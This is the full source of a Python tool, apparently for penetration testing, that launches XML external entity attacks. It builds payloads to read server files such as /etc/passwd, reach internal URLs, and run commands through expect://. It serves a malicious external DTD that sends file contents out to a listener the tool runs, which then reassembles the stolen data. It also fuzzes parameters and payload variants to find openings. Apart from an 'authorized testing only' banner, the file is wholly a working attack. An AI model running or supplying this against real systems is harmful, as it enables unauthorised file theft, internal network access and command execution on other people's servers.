#!/usr/bin/env python3
# xxe_all_in_one.py
# Interactive XXE power tester

import os, sys, json, time, base64, zlib, threading, socket, queue, re
from http.server import HTTPServer, BaseHTTPRequestHandler
from dataclasses import dataclass
from typing import Optional, Dict, Tuple, List
import requests

# =========================
# ---- Small utilities ----
# =========================

def ask(prompt: str, default: Optional[str] = None) -> str:
    if default is None or default == "":
        v = input(f"{prompt}: ").strip()
    else:
        v = input(f"{prompt} [{default}]: ").strip()
    return v if v else (default if default is not None else "")

def ask_int(prompt: str, default: int) -> int:
    while True:
        try:
            return int(ask(prompt, str(default)))
        except ValueError:
            print("  Enter a valid integer.")

def ask_yesno(prompt: str, default_yes: bool = True) -> bool:
    d = "Y/n" if default_yes else "y/N"
    v = input(f"{prompt} [{d}]: ").strip().lower()
    if not v:
        return default_yes
    return v in ("y","yes")

def read_multiline(prompt: str, end_marker: str = "EOF") -> str:
    print(f"{prompt} (end with a single line containing {end_marker})")
    lines = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line.strip() == end_marker:
            break
        lines.append(line)
    return "\n".join(lines)

def ensure_dir(path: str):
    os.makedirs(path, exist_ok=True)

def save_profile(path: str, data: dict):
    ensure_dir(os.path.dirname(path))
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    print(f"[profile] saved -> {path}")

def load_profile(path: str) -> dict:
    with open(path, "r") as f:
        data = json.load(f)
    print(f"[profile] loaded <- {path}")
    return data

def now_ms() -> int:
    return int(time.time() * 1000)

# =========================
# ---- Smart decoding  ----
# =========================

def try_b64(s: str) -> str:
    # robust-ish b64 try
    try:
        s_stripped = re.sub(r"[^A-Za-z0-9+/=\n\r]", "", s).strip()
        if not s_stripped:
            return ""
        b = base64.b64decode(s_stripped, validate=False)
        return b.decode("utf-8", errors="ignore")
    except Exception:
        return ""

def try_inflate_bytes(b: bytes) -> str:
    try:
        return zlib.decompress(b, 16 + zlib.MAX_WBITS).decode("utf-8", "ignore")
    except Exception:
        return ""

def smart_preview(body: str) -> str:
    if not body:
        return body
    # maybe it's base64
    if len(body) >= 64 and all(c.isalnum() or c in "+/= \n\r" for c in body[:200]):
        dec = try_b64(body)
        if dec:
            infl = try_inflate_bytes(dec.encode())
            return infl or dec
    # maybe the server returned gzip-ish data as text
    infl = try_inflate_bytes(body.encode())
    return infl or body

# =========================
# ---- Built-in servers ---
# =========================

class CaptureState:
    lock = threading.Lock()
    lines: List[str] = []
    b64_chunks: List[str] = []  # collected from /b64?d=...
    raw_hits: List[Tuple[str, str]] = []  # (method, path)

class OOBHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        with CaptureState.lock:
            CaptureState.lines.append(f"{self.client_address[0]} GET {self.path}")
            CaptureState.raw_hits.append(("GET", self.path))
            if self.path.startswith("/b64"):
                # grab d= param
                m = re.search(r"[?&]d=([^&]+)", self.path)
                if m:
                    CaptureState.b64_chunks.append(m.group(1))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        length = int(self.headers.get('Content-Length', '0') or 0)
        body = self.rfile.read(length) if length else b""
        with CaptureState.lock:
            CaptureState.lines.append(f"{self.client_address[0]} POST {self.path} len={len(body)}")
            CaptureState.raw_hits.append(("POST", self.path))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def start_http_server(port: int, handler_cls) -> HTTPServer:
    srv = HTTPServer(("0.0.0.0", port), handler_cls)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv

# DTD server: will serve a global text
DTD_TEXT = ""
class DTDHandler(OOBHandler):
    def do_GET(self):
        if self.path.startswith("/evil.dtd"):
            data = DTD_TEXT.encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/xml")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        else:
            super().do_GET()

# =========================
# ---- Payload builders ----
# =========================

def p_inband_file(path: str) -> str:
    return f'''<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY a SYSTEM "file://{path}"> ]>
<x>&a;</x>'''

def p_http_oob(oob_url: str) -> str:
    return f'''<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY a SYSTEM "{oob_url}"> ]>
<x>&a;</x>'''

def p_dns_oob(domain: str) -> str:
    return f'''<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY a SYSTEM "http://{domain}/xxe"> ]>
<x>&a;</x>'''

def p_ssrf(url: str) -> str:
    return f'''<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY a SYSTEM "{url}"> ]>
<x>&a;</x>'''

def p_php_filter_b64(path: str) -> str:
    filt = f'php://filter/convert.base64-encode/resource={path}'
    return f'''<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY a SYSTEM "{filt}"> ]>
<x>&a;</x>'''

def p_expect(cmd: str) -> str:
    return f'''<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY a SYSTEM "expect://{cmd}"> ]>
<x>&a;</x>'''

def p_ext_dtd(host: str, port: int, resource: str="/etc/passwd", chunked=False) -> Tuple[str,str]:
    dtd_url = f"http://{host}:{port}/evil.dtd"
    if not chunked:
        dtd = f'''<!ENTITY % file SYSTEM "file://{resource}">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://{host}:{port}/leak?d=%file;'>"> %all;'''
    else:
        dtd = f'''<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={resource}">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://{host}:{port}/b64?d=%file;'>"> %all;'''
    xml = f'''<?xml version="1.0"?>
<!DOCTYPE x SYSTEM "{dtd_url}">
<x>ok</x>'''
    return xml, dtd

# SOAP wrapper
def wrap_soap(xml_inner: str, action: str = "urn:DoParse") -> Tuple[str, Dict[str,str]]:
    envelope = f'''<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/><soapenv:Body>{xml_inner}</soapenv:Body>
</soapenv:Envelope>'''
    return envelope, {"SOAPAction": action, "Content-Type": "application/soap+xml"}

# Mutators
def mutate_xml(xml: str) -> List[str]:
    variants = [
        xml,
        xml.replace("<!DOCTYPE", "<!doctype"),
        xml.replace("SYSTEM", "SYSTEM\t"),
        xml.replace("!ENTITY", " !ENTITY"),
        xml.replace("http://", "HTTP://"),
        xml.replace("<x>", "<x>\n"),
    ]
    # dedupe while preserving order
    seen, out = set(), []
    for v in variants:
        if v not in seen:
            seen.add(v); out.append(v)
    return out

# =========================
# ---- Request profiles ----
# =========================

@dataclass
class RequestProfile:
    transport: str        # "post-body" | "get-param" | "post-param" | "multipart"
    param_name: str = "xml"
    file_field: str = "file"
    file_name: str = "config.xml"
    content_type: str = "application/xml"  # or text/xml, application/soap+xml
    cookie: str = ""
    authorization: str = ""
    extra_headers: Dict[str,str] = None
    verify_tls: bool = True
    proxy: str = ""       # http://127.0.0.1:8080
    timeout: int = 10

COMMON_PARAMS = ["xml","data","config","payload","content","doc","body","soap","file"]
COMMON_FIELDS = ["file","upload","config","import","data"]
CONTENT_TYPES = ["application/xml","text/xml","application/soap+xml"]

def send_xml(url: str, xml: str, prof: RequestProfile) -> requests.Response:
    headers = {"Accept-Language": "en-US,en", "Connection": "keep-alive", "Referer": "http://example.com"}
    if prof.transport == "post-body":
        headers["Content-Type"] = prof.content_type
    if prof.cookie: headers["Cookie"] = prof.cookie
    if prof.authorization: headers["Authorization"] = prof.authorization
    if prof.extra_headers: headers.update(prof.extra_headers)
    proxies = {"http": prof.proxy, "https": prof.proxy} if prof.proxy else None

    if prof.transport == "post-body":
        return requests.post(url, data=xml.encode(), headers=headers, timeout=prof.timeout,
                             verify=prof.verify_tls, allow_redirects=True, proxies=proxies)
    elif prof.transport == "get-param":
        return requests.get(url, params={prof.param_name: xml}, headers=headers, timeout=prof.timeout,
                            verify=prof.verify_tls, allow_redirects=True, proxies=proxies)
    elif prof.transport == "post-param":
        return requests.post(url, data={prof.param_name: xml}, headers=headers, timeout=prof.timeout,
                             verify=prof.verify_tls, allow_redirects=True, proxies=proxies)
    elif prof.transport == "multipart":
        files = {prof.file_field: (prof.file_name, xml, "application/xml")}
        return requests.post(url, files=files, headers=headers, timeout=prof.timeout,
                             verify=prof.verify_tls, allow_redirects=True, proxies=proxies)
    else:
        raise ValueError("Unknown transport")

# =========================
# ---- Core runner logic ---
# =========================

KEYWORDS = [
    "root:x:0:0", "daemon:x:", "bin:x:", "sys:x:", "nobody:x:",
    ":/bin/bash", "/usr/sbin/nologin", ":/home/", ":x:1000:", "<?xml", "<!DOCTYPE"
]

def analyze(body: str) -> Tuple[bool, List[str]]:
    hits = [kw for kw in KEYWORDS if kw in body]
    return (len(body) > 0 or bool(hits)), hits

def save_body(prefix: str, body: str):
    ensure_dir("captures")
    ts = now_ms()
    path = f"captures/{prefix}_{ts}.txt"
    with open(path, "w", encoding="utf-8", errors="ignore") as f:
        f.write(body)
    print(f"    [saved -> {path}]")

def score_attempt(resp: Optional[requests.Response], elapsed: float, hits: List[str]) -> float:
    # Higher is better
    if resp is None:
        return 0.0
    base = 0.0
    if resp.ok: base += 2.0
    base += min(len(hits), 5) * 1.0
    base += min(elapsed, 5.0) * 0.2  # a tiny reward for slower (maybe fetched external)
    base += min(len(resp.text), 10000) / 10000.0
    return base

def backoff_sleep(retry_idx: int, base: float = 0.5, cap: float = 4.0):
    t = min(cap, base * (2 ** retry_idx))
    time.sleep(t)

def dispatcher(tasks: List[Tuple[str, str, RequestProfile, dict]], concurrency: int, verbose: bool, backoff: bool) -> List[dict]:
    """
    tasks: list of (label, xml, profile, opts)
    opts: {"url":..., "soap": bool, "mutate": bool, "max_retries": int}
    """
    out = []
    q = queue.Queue()
    for t in tasks: q.put(t)
    lock = threading.Lock()

    def worker():
        while True:
            try:
                label, xml, prof, opts = q.get_nowait()
            except queue.Empty:
                return
            result = {"label": label, "status": "err", "elapsed": 0.0, "score": 0.0, "hits": [], "len": 0}
            url = opts["url"]
            payloads = [xml]

            # SOAP variant auto-wrapper
            if opts.get("soap", False):
                env, soap_headers = wrap_soap(xml)
                prof_soap = RequestProfile(**{**prof.__dict__})
                prof_soap.content_type = "application/soap+xml"
                prof_soap.extra_headers = {**(prof.extra_headers or {}), **soap_headers}
                payloads.append((env, prof_soap))
            else:
                payloads.append((xml, prof))

            # Mutate payloads (apply to non-SOAP and SOAP if present)
            final_payloads: List[Tuple[str, RequestProfile, str]] = []
            for item in payloads:
                if isinstance(item, tuple):
                    px, pp = item
                else:
                    px, pp = item, prof
                if opts.get("mutate", False):
                    for m in mutate_xml(px):
                        final_payloads.append((m, pp, "mut"))
                final_payloads.append((px, pp, "orig"))

            # Try each payload with simple retry/backoff
            max_retries = opts.get("max_retries", 1)
            for (px, pp, vtag) in final_payloads:
                for attempt in range(max_retries):
                    t0 = time.time()
                    resp = None
                    try:
                        resp = send_xml(url, px, pp)
                        elapsed = time.time() - t0
                        body = resp.text or ""
                        meaningful, hits = analyze(body)
                        sp = smart_preview(body)
                        if verbose:
                            print(f"[{label}|{vtag}] -> {'OK' if resp.ok else resp.status_code} {elapsed:.2f}s len={len(body)} hits={','.join(hits) or '-'}")
                            print(sp[:4096])
                            print("-" * 40)
                        if meaningful:
                            save_body("resp", body)
                        sc = score_attempt(resp, elapsed, hits)
                        with lock:
                            out.append({
                                "label": f"{label}|{vtag}",
                                "status": str(resp.status_code),
                                "elapsed": elapsed,
                                "score": sc,
                                "hits": hits,
                                "len": len(body)
                            })
                        break  # success or at least done without raising
                    except requests.RequestException as e:
                        elapsed = time.time() - t0
                        if verbose:
                            print(f"[{label}|{vtag}] ! {e.__class__.__name__}: {e}")
                        if backoff and attempt < max_retries - 1:
                            backoff_sleep(attempt)
                        continue
            q.task_done()

    threads = []
    for _ in range(max(1, concurrency)):
        t = threading.Thread(target=worker, daemon=True)
        threads.append(t); t.start()
    for t in threads: t.join()
    return out

# =========================
# ---- Interactive main ----
# =========================

def main():
    print("XXE All-in-One (interactive). Authorized testing only.\n")

    defaults = {
        "url": "https://TARGET/path",
        "transport": "post-body",                 # post-body|get-param|post-param|multipart
        "param_name": "xml",
        "file_field": "file",
        "file_name": "config.xml",
        "content_type": "application/xml",
        "cookie": "",
        "authorization": "",
        "verify_tls": True,
        "proxy": "",
        "timeout": 10,
        "loops": 1,
        "concurrency": 2,
        "verbose": False,
        "mutate": True,
        "soap_auto": True,
        "backoff": True,
        "max_retries": 2,
        "oob_listen": True,
        "oob_port": 8000,
        "dtd_port": 8888,
        "profile": "",
    }

    # Optional: load a profile
    prof_name = ask("Load profile name (blank = none)", defaults["profile"])
    if prof_name:
        if os.path.exists(f"profiles/{prof_name}.json"):
            defaults.update(load_profile(f"profiles/{prof_name}.json"))
        else:
            print("  (no existing profile; will create after run)")
        defaults["profile"] = prof_name

    oob_srv = None
    dtd_srv = None

    while True:
        try:
            url = ask("Target URL", defaults["url"])
            if not (url.startswith("http://") or url.startswith("https://")):
                print("  URL must start with http:// or https://"); continue

            # Transport & headers
            print("\nTransport: 1) post-body  2) get-param  3) post-param  4) multipart")
            tsel = ask("Select", {"post-body":"1","get-param":"2","post-param":"3","multipart":"4"}.get(defaults["transport"],"1"))
            transport = { "1":"post-body","2":"get-param","3":"post-param","4":"multipart" }.get(tsel,"post-body")

            param_name = defaults["param_name"]
            file_field = defaults["file_field"]
            file_name = defaults["file_name"]
            content_type = defaults["content_type"]

            if transport == "post-body":
                print("Content-Type options:", ", ".join(CONTENT_TYPES))
                content_type = ask("Content-Type", content_type)
            elif transport in ("get-param","post-param"):
                param_name = ask("Parameter name", param_name)
            else:
                file_field = ask("File field name", file_field)
                file_name = ask("Upload filename", file_name)

            cookie = ask("Cookie header", defaults["cookie"])
            authorization = ask("Authorization header", defaults["authorization"])
            verify_tls = ask_yesno("Verify TLS?", defaults["verify_tls"])
            proxy = ask("Proxy (http://127.0.0.1:8080 for Burp, blank none)", defaults["proxy"])
            timeout = ask_int("Timeout (s)", defaults["timeout"])
            loops = ask_int("Number of request batches", defaults["loops"])
            concurrency = max(1, min(5, ask_int("Concurrency (1-5)", defaults["concurrency"])))
            verbose = ask_yesno("Verbose output?", defaults["verbose"])
            mutate = ask_yesno("Mutate payload variants?", defaults["mutate"])
            soap_auto = ask_yesno("Try SOAP auto-wrapper variant?", defaults["soap_auto"])
            backoff = ask_yesno("Use retry backoff on errors?", defaults["backoff"])
            max_retries = ask_int("Max retries per variant", defaults["max_retries"])

            # Mode selection
            print("\nModes:")
            print(" 1) In-band file read")
            print(" 2) Blind HTTP OOB")
            print(" 3) Blind DNS OOB (print-only)")
            print(" 4) SSRF")
            print(" 5) PHP filter base64")
            print(" 6) expect:// (labs only)")
            print(" 7) External DTD (parameter entities; auto serve)")
            print(" 8) Custom XML")
            msel = ask("Select mode", "1")

            # Build base payload (may change below)
            xml = ""
            dtd_text = ""
            if msel == "1":
                path = ask("File path", "/etc/passwd")
                xml = p_inband_file(path)
            elif msel == "2":
                # OOB listener
                if ask_yesno("Start built-in OOB HTTP listener?", defaults["oob_listen"]):
                    oob_port = ask_int("Listener port", defaults["oob_port"])
                    if oob_srv is None:
                        oob_srv = start_http_server(oob_port, OOBHandler)
                        print(f"  [OOB] Listening on 0.0.0.0:{oob_port}")
                    # aim to use local IP
                    try:
                        local_ip = socket.gethostbyname(socket.gethostname())
                    except Exception:
                        local_ip = "127.0.0.1"
                    xml = p_http_oob(f"http://{local_ip}:{oob_port}/xxe")
                    defaults["oob_listen"] = True
                    defaults["oob_port"] = oob_port
                else:
                    oob_url = ask("Your OOB URL", "http://10.10.10.10:8000/xxe")
                    xml = p_http_oob(oob_url)
            elif msel == "3":
                domain = ask("Your DNS capture domain", "collaborator.example")
                xml = p_dns_oob(domain)
                print("  (Use Burp Collaborator / interact.sh to observe hits.)")
            elif msel == "4":
                target = ask("Internal URL (e.g., http://127.0.0.1:8080/admin)", "http://127.0.0.1:8080/")
                xml = p_ssrf(target)
            elif msel == "5":
                path = ask("File path", "/var/www/html/config.php")
                xml = p_php_filter_b64(path)
            elif msel == "6":
                cmd = ask("Command (labs only)", "id")
                xml = p_expect(cmd)
            elif msel == "7":
                host = ask("Host to serve DTD (this machine IP)", "127.0.0.1")
                dtd_port = ask_int("DTD HTTP port", defaults["dtd_port"])
                resource = ask("File to exfiltrate", "/etc/passwd")
                chunked = ask_yesno("Use base64 exfil (php filter)?", False)
                xml, dtd_text = p_ext_dtd(host, dtd_port, resource, chunked)
                global DTD_TEXT
                DTD_TEXT = dtd_text
                if dtd_srv is None:
                    dtd_srv = start_http_server(dtd_port, DTDHandler)
                    print(f"  [DTD] Serving /evil.dtd on 0.0.0.0:{dtd_port}")
                defaults["dtd_port"] = dtd_port
            else:
                xml = read_multiline("Paste full XML", "EOF")
                if not xml.strip():
                    print("  No payload."); continue

            # Discovery mini-fuzzer setup
            do_discover = ask_yesno("\nRun mini fuzzer (params/fields/CT + SOAP)?", True)
            transports = [transport] if not do_discover else ["post-body","get-param","post-param","multipart"]
            ct_list = [content_type] if not do_discover else CONTENT_TYPES

            # Build tasks
            tasks = []
            for _loop in range(loops):
                for tr in transports:
                    # param or field dictionaries per transport
                    param_candidates = [param_name] if tr in ("get-param","post-param") and not do_discover else COMMON_PARAMS
                    field_candidates = [file_field] if tr == "multipart" and not do_discover else COMMON_FIELDS
                    ct_candidates = ct_list if tr == "post-body" else [None]

                    for ct in ct_candidates:
                        if tr in ("get-param","post-param"):
                            for p in param_candidates:
                                prof = RequestProfile(
                                    transport=tr, param_name=p, content_type=(ct or "application/xml"),
                                    file_field=file_field, file_name=file_name,
                                    cookie=cookie, authorization=authorization, extra_headers={},
                                    verify_tls=verify_tls, proxy=proxy, timeout=timeout
                                )
                                tasks.append((f"{tr}|param={p}|ct={ct or '-'}", xml, prof,
                                              {"url": url, "mutate": mutate, "soap": soap_auto, "max_retries": max_retries}))
                        elif tr == "multipart":
                            for fld in field_candidates:
                                prof = RequestProfile(
                                    transport=tr, file_field=fld, file_name=file_name,
                                    content_type="application/xml", param_name=param_name,
                                    cookie=cookie, authorization=authorization, extra_headers={},
                                    verify_tls=verify_tls, proxy=proxy, timeout=timeout
                                )
                                tasks.append((f"{tr}|field={fld}", xml, prof,
                                              {"url": url, "mutate": mutate, "soap": soap_auto, "max_retries": max_retries}))
                        else:
                            prof = RequestProfile(
                                transport="post-body", content_type=(ct or "application/xml"),
                                cookie=cookie, authorization=authorization, extra_headers={},
                                verify_tls=verify_tls, proxy=proxy, timeout=timeout
                            )
                            tasks.append((f"{tr}|ct={ct or '-'}", xml, prof,
                                          {"url": url, "mutate": mutate, "soap": soap_auto, "max_retries": max_retries}))

            print(f"\n[+] Running {len(tasks)} request variants with concurrency={concurrency} ...")
            results = dispatcher(tasks, concurrency=concurrency, verbose=verbose, backoff=backoff)

            # Show best attempts
            best = sorted(results, key=lambda r: r["score"], reverse=True)[:10]
            print("\n=== Best attempts ===")
            for b in best:
                print(f"{b['label']:<40}  HTTP {b['status']:<3}  t={b['elapsed']:.2f}s  len={b['len']:<5}  hits={','.join(b['hits']) or '-'}  score={b['score']:.2f}")

            # Show OOB captures (if any)
            if oob_srv is not None and CaptureState.lines:
                print("\n=== OOB callbacks (last 20) ===")
                for line in CaptureState.lines[-20:]:
                    print("  ", line)
            if CaptureState.b64_chunks:
                try:
                    joined = "".join(CaptureState.b64_chunks)
                    decoded = base64.b64decode(joined).decode("utf-8", "ignore")
                    print("\n=== Reassembled base64 exfil ===")
                    print(decoded[:8192])
                    save_body("oob_b64", decoded)
                except Exception:
                    print("\n[!] Failed to decode reassembled base64 from OOB chunks.")

            # Persist defaults + profile
            defaults.update({
                "url": url, "transport": transport, "param_name": param_name,
                "file_field": file_field, "file_name": file_name, "content_type": content_type,
                "cookie": cookie, "authorization": authorization, "verify_tls": verify_tls,
                "proxy": proxy, "timeout": timeout, "loops": loops, "concurrency": concurrency,
                "verbose": verbose, "mutate": mutate, "soap_auto": soap_auto,
                "backoff": backoff, "max_retries": max_retries
            })
            if prof_name:
                defaults["profile"] = prof_name
                save_profile(f"profiles/{prof_name}.json", defaults)

            if not ask_yesno("\nRun another batch?", True):
                print("Bye.")
                break

        except KeyboardInterrupt:
            print("\nInterrupted. Bye.")
            break
        except Exception as e:
            print(f"[error] {e}\n")

if __name__ == "__main__":
    main()
